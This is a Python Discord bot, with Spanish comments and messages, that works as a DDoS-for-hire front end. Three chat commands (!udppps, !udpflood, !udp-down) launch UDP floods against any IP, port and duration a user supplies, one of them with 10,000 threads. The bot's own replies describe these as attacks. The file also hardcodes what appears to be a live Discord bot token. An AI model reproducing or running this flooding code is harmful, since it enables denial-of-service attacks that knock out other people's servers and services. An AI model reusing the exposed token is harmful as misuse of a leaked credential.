import discord
from discord.ext import commands
import socket
import sys
import time
import asyncio
import threading
from random import randint

# Reemplaza 'TU_TOKEN_AQUÍ' con el token de tu bot de Discord
TOKEN = 'MTM3ODA4MjUxNjMyMTE3NzY2MQ.G254Zc.lQI_PQYR07wuVEOgBIC7cH6fMcIthV8I1eEQj8'

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')

@bot.command(name='ayuda')
async def ayuda(ctx):
    help_text = (
        "**Comandos disponibles:**\n"
        "- `!ayuda`\n"
        "- `!methods`"
    )
    image_path = '/data/data/com.termux/files/home/storage/pictures/anime-demon-pictures-ydwfrvu4ub9662i0.jpg'
    await ctx.send(content=help_text, file=discord.File(image_path))

@bot.command(name='methods')
async def methods(ctx):
    methods_text = (
        "🚀**Métodos disponibles:**🚀\n"
        "- `!udppps`\n"
        "- `!udpflood`\n"
        "- `!udp-down`"
    )
    await ctx.send(methods_text)

# ------------------ UDPPPS ------------------
class Brutalize:
    def __init__(self, ip, port, packet_size=1024, threads=5):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.threads = threads
        self.client = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.data = str.encode("x" * self.packet_size)
        self.len = len(self.data)
        self.on = False
        self.sent = 0
        self.total = 0

    def flood(self, duration):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            threading.Thread(target=self.send, daemon=True).start()
        threading.Thread(target=self.info, daemon=True).start()
        end_time = time.time() + duration
        try:
            while time.time() < end_time and self.on:
                time.sleep(0.1)
            self.stop()
        except KeyboardInterrupt:
            self.stop()

    def info(self):
        interval = 0.05
        mb = 1000000
        gb = 1000000000
        size = 0
        self.total = 0
        last_time = time.time()
        while self.on:
            time.sleep(interval)
            if not self.on:
                break
            now = time.time()
            if now - last_time >= 1:
                size = round(self.sent / mb)
                self.total += self.sent / gb
                print(f"{size} Mb/s - Total: {round(self.total, 2)} Gb.", end='\r')
                self.sent = 0
                last_time = now

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except Exception:
                pass

    def _randport(self):
        return self.port or randint(1, 65535)

@bot.command(name='udppps')
async def udppps(ctx, ip: str, port: int, tiempo: int):
    usage_text = (
        "**⚠️Descripción⚠️:**\n"
        "`!udppps <ip> <port> <time>`"
    )
    await ctx.send(usage_text)

    await ctx.send(f"Enviando a {ip}:{port} durante {tiempo} segundos")
    try:
        brute = Brutalize(ip, port, 1024, 5)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, brute.flood, tiempo)
        await ctx.send(f"✅UDPPPS finalizado✅")
    except Exception as e:
        await ctx.send(f"Error al ejecutar UDPPPS: {e}")

@udppps.error
async def udppps_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌Uso correcto: `!udppps <ip> <port> <time>`")
    else:
        await ctx.send(f"Ocurrió un error: {error}")

# ------------------ UDP-FLOOD (renombrado de UDP-Power) ------------------
def send_packet_flood(ip, port, amplifier, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(ip), int(port)))
        while not stop_event.is_set():
            s.send(b"\x99" * amplifier)
    except Exception:
        try:
            s.close()
        except:
            pass

def udp_flood_attack(ip, port, duration, amplifier):
    loops = 10000
    stop_event = threading.Event()
    threads = []
    for _ in range(loops):
        t = threading.Thread(target=send_packet_flood, args=(ip, port, amplifier, stop_event), daemon=True)
        t.start()
        threads.append(t)
    time.sleep(duration)
    stop_event.set()
    # Opcional: esperar que terminen los threads (no es necesario si son daemon)

@bot.command(name='udpflood')
async def udpflood(ctx, ip: str, port: int, tiempo: int):
    usage_text = (
        "**⚠️Descripción⚠️**\n"
        "`!udpflood <ip> <port> <time>`"
    )
    await ctx.send(usage_text)

    await ctx.send(f"Enviando a {ip}:{port} durante {tiempo} segundos, size=750...")
    try:
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, udp_flood_attack, ip, port, tiempo, 750)
        await ctx.send(f"✅UDP-FLOOD finalizado✅")
    except Exception as e:
        await ctx.send(f"Error al ejecutar UDP-FLOOD: {e}")

@udpflood.error
async def udpflood_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌Uso correcto: `!udpflood <ip> <port> <time>`")
    else:
        await ctx.send(f"Ocurrió un error: {error}")

# ------------------ UDP-DOWN ------------------
@bot.command(name='udp-down')
async def udp_down(ctx, ip: str, port: int, tiempo: int):
    usage_text = (
        "🚀**Descripción**🚀\n"
        ":✅Enviando Ataque✅\n"
    )
    await ctx.send(usage_text)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
        end_time = time.time() + tiempo
        sent_packets = 0
        await ctx.send(f"Enviando Ataque a {ip}:{port} durante {tiempo} segundos...")
        while time.time() < end_time:
            s.sendto(payload, (ip, port))
            sent_packets += 1
            await asyncio.sleep(0)
        await ctx.send(f"✅UDP-DOWN finalizado✅ {sent_packets}")
    except Exception as e:
        await ctx.send(f"Error al ejecutar UDP-DOWN: {e}")

@udp_down.error
async def udp_down_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌Uso correcto: `!udp-down <ip> <port> <time>`")
    else:
        await ctx.send(f"Ocurrió un error: {error}")

bot.run(TOKEN)
